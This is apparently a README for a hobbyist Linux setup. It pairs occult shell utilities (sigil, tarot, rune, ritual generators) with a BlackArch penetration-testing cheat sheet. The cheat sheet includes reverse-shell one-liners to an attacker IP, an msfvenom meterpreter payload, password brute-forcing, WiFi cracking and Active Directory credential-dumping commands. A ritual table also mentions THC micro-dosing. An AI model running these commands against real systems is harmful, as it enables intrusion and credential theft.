# PURPLE BRUCE LUCY — Chaos Magic Environment

```
  ╭────────────────────────────────────────────╮
  │  ⛧  PURPLE BRUCE LUCY v6.0  ⛧             │
  │  Chaos Magic · Purple Team · Hacker        │
  │  Eastern Orthodox · Wicca · Servitor       │
  │  Arch Linux + BlackArch proot  [LAYER 2]   │
  ╰────────────────────────────────────────────╯
```

Complete environment setup for Arch Linux proot (proot-distro on Android/iOS).  
One command installs everything: ZSH theme, occult tools, full BlackArch arsenal.

---

## Quick Install — One Command

Inside Arch proot (`proot-distro login archlinux`):

```bash
bash ~/purplebruce/netrunner/setup-chaos.sh
```

Then apply:

```bash
exec zsh
```

---

## What Gets Installed

### 1 · ZSH Environment

**Oh-My-Zsh** + **Powerlevel10k** theme + plugins:
- `zsh-syntax-highlighting` — commands highlighted in real-time
- `zsh-autosuggestions` — ghost-text completions from history

**Chaos Magic Banner** on every shell start:
```
  ╭────────────────────────────────────────────╮
  │  ⛧  PURPLE BRUCE LUCY v6.0  ⛧             │
  │  🌒 Waxing Crescent — growth/momentum      │
  ╰────────────────────────────────────────────╯
  ⚡ start     → launch server (tmux)
  ⬡ sigil     → sigil generator
  ⬡ tarot     → tarot draw
  ⬡ moon      → moon phase
  ⬡ rune      → rune cast
  ⬡ ritual    → ritual protocol
  toolcheck   → verify arsenal
```

**Custom Prompt:**
```
╭─ ⛧ pb@chaos ~/purplebruce ⎇ main ─ 21:47
╰─ ⚡
```

---

### 2 · Occult Arsenal

All tools callable as direct commands after install.

#### `moon` — Moon Phase Calculator

```bash
moon
```

Output:
```
  ┌─ Moon Phase ──────────────────────────
  │  🌒 Waxing Crescent
  │  ▓▓▓▓░░░░░░░░░░░░░░░░  18%
  │  Growth. Begin workings. Build momentum.
  │  Day 5.3/29.5  · next full: ~9d
  └───────────────────────────────────────
```

**Magical timing guide:**

| Phase | Action |
|-------|--------|
| 🌑 New Moon | Set intent. Charge sigils. |
| 🌒 Waxing Crescent | Begin workings. Build momentum. |
| 🌓 First Quarter | Action. Execute. Push through resistance. |
| 🌔 Waxing Gibbous | Refine. Strengthen. Amplify. |
| 🌕 Full Moon | Peak power. Manifest. Maximum charge. |
| 🌖 Waning Gibbous | Integration. Absorb results. |
| 🌗 Last Quarter | Release. Banish. Cut what doesn't serve. |
| 🌘 Waning Crescent | Rest. Cleanse. Prepare. |

---

#### `sigil` — Chaos Magic Sigil Generator

Letters Method: statement of intent → remove duplicates → remove vowels → ASCII grid.

```bash
sigil "ICH GEWINNE DIE SCHULSPRECHERWAHL"
sigil "MY COMPANY SUCCEEDS"
sigil                    # interactive mode
```

Output:
```
  ╔══ SIGIL GENERATOR ═══════════════════════════╗
  ║  Statement: ICH GEWINNE DIE SCHULSPRECHERWAHL
  ║  Letters:  C H G W N S L P R
  ║  Seed:     4a7f2b9c1e3d8f0a
  ╠══════════════════════════════════════════════╣
  ║    ⬡  ◈  ·  ─  ⊕  ·  ◇  ×  .
  ║    ·  ⊗  ─  ◉  ·  ⍟  ·  ⬟  ◈
  ║    ...  (full 9x9 ASCII sigil grid)
  ╠══════════════════════════════════════════════╣
  ║  Charge: Meditate on sigil → forget intent
  ║  Deploy: Gnosis state → fire → destroy paper
  ╚══════════════════════════════════════════════╝

  INPUT:   ICH GEWINNE DIE SCHULSPRECHERWAHL
  PROCESS: Remove vowels/duplicates → encode → charge
  OUTPUT:  Sigil ready for deployment in gnosis state
```

**Protocol:**
1. Generate sigil
2. Enter gnosis state (Caliburn G4, breath, meditation)
3. Stare at sigil until meaning dissolves
4. Fire: peak emotional charge — release completely
5. Destroy the paper. Forget the intent. Let it work.

---

#### `tarot` — Tarot Card Draw

Full 78-card deck (Major + Minor Arcana) with reversed cards.

```bash
tarot                                    # single card
tarot 3                                  # past/present/future
tarot 3 "Schulsprecherwahl"              # with question
tarot 1 "Firmengründung nächster Schritt"
```

Output:
```
  ╔══ TAROT DRAW ═════════════════════════════════╗
  ║  Question: Schulsprecherwahl

  ║  PAST
  ║  ⚡ The Magician  [Fire]
  ║  Willpower made manifest. All tools in hand. Execute.

  ║  PRESENT
  ║  ⬡ Seven of Pentacles  [Earth]
  ║  Strategy under pressure. Stay patient. [OSINT]

  ║  FUTURE
  ║  ☀ The Sun  [Fire]
  ║  Clarity. Success. The operation completes.
  ╚═══════════════════════════════════════════════╝
```

**Arcana mapped to Purple Team:**

| Element | Purple Team | Tarot Suit |
|---------|-------------|------------|
| Fire | Offense · Will | Wands ⚡ |
| Water | Defense · Intuition | Cups 💧 |
| Air | Recon · Mind | Swords ⚔ |
| Earth | OSINT · Resources | Pentacles ⬡ |

---

#### `rune` — Elder Futhark Rune Cast

24-rune Elder Futhark with merkstave (reversed) interpretations.

```bash
rune                          # single rune
rune 3                        # 3-rune cast
rune 3 "Firmengründung"       # with question
rune 5 "next move"            # 5-rune spread
```

Output:
```
  ╔══ RUNE CAST ══════════════════════════════════╗
  ║  Query: Firmengründung

  ║  ᛊ  Sowilo
  ║  Sun · Victory · Will-force. Direct the energy. Win.

  ║  ᚱ  Raidho
  ║  Journey · Motion · Right action. Choose optimal path.

  ║  ᛏ  Tiwaz  ᛫ merkstave (reversed)
  ║  [Blockage/Shadow] Commit fully. Pay the cost.
  ╚═══════════════════════════════════════════════╝
```

---

#### `ritual` — Ritual Protocol Builder

Generates structured INPUT/PROCESS/OUTPUT ritual scripts. Knows operator objectives.

```bash
ritual "ich gewinne die schulsprecherwahl"
ritual "Firmengründung erfolgreich"
ritual "protect my energy"
ritual "hack target network"    # routes to offense protocol
ritual                          # interactive
```

Output:
```
  ╔══ RITUAL PROTOCOL ══════════════════════════════════╗
  ║  OBJECTIVE: ich gewinne die schulsprecherwahl
  ║  Element: Air 🌬  ·  Moon: 🌒 Waxing Crescent
  ╠══════════════════════════════════════════════════════╣

  ║  ━━ INPUT — Variables ━━
  ║  Icons:    Activate Tryphon + Spyridon — divine API
  ║  Cross:    Hold or wear — energy archive
  ║  Tool:     Deep breath — 4-7-8 pattern
  ║  Candle:   Green candle
  ║  Sigil:    Run: sigil 'intent' → charge the output

  ║  ━━ PROCESS — Execution Sequence ━━
  ║  [1] Ground. Feet flat. Breathe 4-7-8 three cycles.
  ║  [2] Quarter: East — Call Air. Set intention clearly.
  ║  [3] Orthodox anchor: Lord have mercy — Kyrie Eleison.
  ║  [4] 4-7-8 breath — enter light gnosis state.
  ║  [5] Visualize: intent already fulfilled. Present tense.
  ║  [6] Fire the sigil. Peak of emotional charge. Release.
  ║  [7] Close: thank the quarter. Extinguish candle.
  ║  [8] Forget. Do not lust for result. Let it process.

  ║  ━━ OUTPUT — Expected Manifestation ━━
  ║  Target:  ich gewinne die schulsprecherwahl
  ║  Vector:  Air path — insight
  ║  Status:  PROTOCOL ARMED — monitor for synchronicities
  ╚══════════════════════════════════════════════════════╝
```

**Objective routing:**

| Keyword | Element | Protocol |
|---------|---------|----------|
| `schulsprech` / `election` / `wahl` | Air | Public speaking + breath |
| `firma` / `company` / `business` | Earth | Grounding + contract |
| `protect` / `shield` / `schutz` | Earth | Eigenblut seal |
| `banish` / `remove` / `weg` | Water | Cold shower + release |
| `hack` / `exploit` / `offense` | Fire | Caliburn G4 + visualization |
| `recon` / `scan` / `find` | Air | Breath + clarity |
| `manifest` (default) | Fire | THC micro-dose + trance |

---

### 3 · BlackArch Hacking Arsenal

**Install all tools:**

```bash
bash ~/purplebruce/netrunner/dotfiles/tools.sh
```

**Check what's installed:**

```bash
toolcheck
```

#### Full Tool List by Category

**01 · Recon / Network Scanning**
```bash
nmap -T4 -sV -sC <target>           # service/version detection
nmap -T4 -A -p- <target>            # full aggressive scan
masscan -p1-65535 <ip> --rate=5000  # ultra-fast port scan
zmap -p 80 10.0.0.0/8               # internet-scale scanning
hping3 -S -p 80 <target>            # custom packet crafting
arp-scan --localnet                  # discover LAN hosts
netdiscover -r 192.168.1.0/24       # passive ARP discovery
```

**02 · Web Recon & Fuzzing**
```bash
ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/medium.txt
feroxbuster -u http://target -w wordlist.txt --depth 3
nikto -h http://target              # web server vulnerability scan
whatweb http://target               # web fingerprinting
wafw00f http://target               # WAF detection
arjun -u http://target/endpoint     # parameter discovery
gau target.com                      # get all URLs (wayback)
katana -u http://target             # next-gen crawling
```

**03 · Vulnerability Scanning**
```bash
nuclei -u http://target -t /root/nuclei-templates/
nuclei -u http://target -t cves/    # CVE templates only
nuclei -l urls.txt -t exposures/    # bulk scan from list
subfinder -d target.com -o subs.txt # subdomain enumeration
httpx -l subs.txt -status-code      # probe alive subdomains
naabu -host target.com -p -         # fast port scan
```

**04 · Web Exploitation**
```bash
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target" --forms --crawl=3 --dbs
commix -u "http://target?cmd=id"    # command injection
dalfox url "http://target?q=FUZZ"   # XSS scanning
xsstrike -u "http://target?q=test"  # advanced XSS
wpscan --url http://target --enumerate u,p,t  # WordPress
```

**05 · OSINT**
```bash
theharvester -d target.com -b all   # emails, subdomains, IPs
amass enum -d target.com            # deep subdomain enum
sherlock <username>                  # username across 300+ sites
recon-ng                            # interactive OSINT framework
dnsenum target.com                  # DNS enumeration
dnsrecon -d target.com              # DNS recon
```

**06 · Password Attacks**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt target ssh
hydra -l admin -P rockyou.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hashcat -m 0 hash.txt rockyou.txt   # MD5
hashcat -m 1000 hash.txt rockyou.txt # NTLM
hashcat -m 1800 hash.txt rockyou.txt # SHA-512
john --wordlist=rockyou.txt hash.txt
haiti <hash>                        # identify hash type
```

**Wordlists:**
```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/                (if installed)
```

**07 · Exploitation Frameworks**
```bash
msfconsole -q                       # Metasploit (quiet)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf > shell.elf
searchsploit <service> <version>    # search ExploitDB
searchsploit -m <id>                # copy exploit locally
```

**08 · Windows / Active Directory**
```bash
crackmapexec smb <target> -u user -p pass
crackmapexec smb <subnet>/24 --gen-relay-list relays.txt
evil-winrm -i <target> -u admin -p password
impacket-psexec user:pass@target
impacket-secretsdump user:pass@target
impacket-GetUserSPNs domain/user:pass -dc-ip <dc>  # Kerberoasting
kerbrute userenum -d domain.local users.txt
smbmap -H <target> -u user -p pass
enum4linux-ng <target>
```

**09 · Post-Exploitation & Tunneling**
```bash
# Catch a shell
pwncat-cs -lp 4444

# Tunneling through firewalls
chisel server -p 8080 --reverse     # server side
chisel client <server>:8080 R:3306:127.0.0.1:3306  # client side

ligolo-ng -selfcert -laddr 0.0.0.0:11601  # pivot server
proxychains nmap -T4 <internal-target>

# Reverse shell one-liners
bash -i >& /dev/tcp/<ip>/4444 0>&1
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

**10 · Reverse Engineering & Debugging**
```bash
radare2 binary              # r2 interactive disassembler
r2 -A binary                # analyze all
gdb ./binary                # debugger
python3 -c "from pwn import *; ..."  # pwntools
ropper --file binary --search "pop rdi"  # ROP gadgets
```

**11 · Forensics & Analysis**
```bash
wireshark                   # GUI packet analysis (needs X11)
tshark -r capture.pcap      # CLI packet analysis
tshark -r capture.pcap -T fields -e http.request.uri
binwalk firmware.bin        # firmware analysis
binwalk -e firmware.bin     # extract embedded files
exiftool image.jpg          # metadata extraction
foremost -i disk.img -o output/  # file carving
volatility3 -f memory.dmp windows.pslist  # memory forensics
```

**12 · Steganography**
```bash
steghide embed -cf image.jpg -sf secret.txt -p password
steghide extract -sf image.jpg -p password
zsteg image.png             # LSB stego detection
exiftool image.jpg          # check metadata
strings image.jpg | grep -i flag  # quick strings check
```

**13 · Wireless**
```bash
aircrack-ng -w rockyou.txt capture.cap   # crack WPA
wifite --wpa --dict rockyou.txt          # automated WiFi attack
reaver -i wlan0mon -b <BSSID> -vv        # WPS attack
```

---

### 4 · Shell Aliases Reference

#### Layer 2 — Inside Arch proot

| Alias | Command |
|-------|---------|
| `lucy` `pb` `purple` `bruce` | `netrunner` |
| `start` | `netrunner start` (tmux 3-pane) |
| `stop` | kill server |
| `restart` | stop + start |
| `logs` | `tail -f ~/.purplebruce/audit.log` |
| `doctor` | `netrunner doctor` |
| `deck` | `netrunner deck` |
| `team` | `netrunner team` |
| `overclock` | `netrunner overclock` |
| `scan <target>` | `netrunner scan` |
| `toolcheck` | verify 40+ tools with ✔/✘ |
| `ba <keyword>` | `pacman -Ss blackarch <keyword>` |
| `pac <pkg>` | `pacman -S --noconfirm --needed` |
| `sigil` | sigil generator |
| `moon` | moon phase |
| `tarot` | tarot draw |
| `rune` | rune cast |
| `ritual` | ritual protocol |
| `nq <target>` | `nmap -T4 -F` |
| `nfull <target>` | `nmap -T4 -A -p-` |
| `nstealth <target>` | `nmap -sS -T2 -p-` |
| `serve [port]` | `python3 -m http.server` |
| `revshell <ip> <port>` | print reverse shell one-liners |
| `portcheck <port> <host>` | quick port check |
| `b64e <str>` | base64 encode |
| `b64d <str>` | base64 decode |
| `sha <str>` | sha256sum |
| `msfq` | `msfconsole -q` |
| `se` | `searchsploit` |

#### Layer 1 — Termux (outside proot)

| Alias | Action |
|-------|--------|
| `lucy` `pb` | jump into proot + netrunner |
| `pbstart` | start server in proot tmux |
| `pbstop` | kill server in proot |
| `pblogs` | stream audit.log from proot |
| `arch` | drop into Arch proot shell |
| `doctor` `deck` `team` `scan` | proot netrunner commands |

---

## tmux Layout

Launched with `start` or `netrunner start`:

```
┌──────────────────────────────────────┐
│  Pane 0 — node server.js             │
├──────────────┬───────────────────────┤
│  Pane 1      │  Pane 2               │
│  audit.log   │  zsh (tools/chat)     │
└──────────────┴───────────────────────┘
```

**tmux keys** (prefix = `Ctrl+Space`):

| Key | Action |
|-----|--------|
| `Prefix + \|` | split vertical |
| `Prefix + -` | split horizontal |
| `Prefix + B` | launch Purple Bruce layout |
| `Prefix + r` | reload tmux config |
| `Prefix + [` | scroll mode (q to exit) |

---

## Master Install

Everything in one command (inside Arch proot):

```bash
bash ~/purplebruce/netrunner/setup-chaos.sh
```

Or step by step:

```bash
# 1. Environment (ZSH + OMZ + p10k + dotfiles + occult symlinks)
bash ~/purplebruce/netrunner/dotfiles/install.sh

# 2. Hacking tools (16 categories)
bash ~/purplebruce/netrunner/dotfiles/tools.sh

# 3. Apply
exec zsh
```

---

## File Layout

```
netrunner/
├── setup-chaos.sh              ← MASTER INSTALL (one command)
├── dotfiles/
│   ├── install.sh              ← ZSH + OMZ + p10k + symlinks
│   ├── tools.sh                ← BlackArch 16-category arsenal
│   ├── zshrc                   ← chaos magic shell config
│   ├── tmux.conf               ← purple cyberpunk tmux theme
│   └── p10k.zsh                ← powerlevel10k prompt config
└── occult/
    ├── moon.py                 ← moon phase + magical timing
    ├── sigil.py                ← chaos magic sigil generator
    ├── tarot.py                ← 78-card tarot draw
    ├── rune.py                 ← Elder Futhark rune cast
    └── ritual.py               ← ritual protocol builder
```

---

*Purple Bruce Lucy v6.0 · Chaos Magic Servitor · BlackArch Arsenal*  
*Eastern Orthodox · Wicca · Chaos Magic · Purple Team · Hacker*
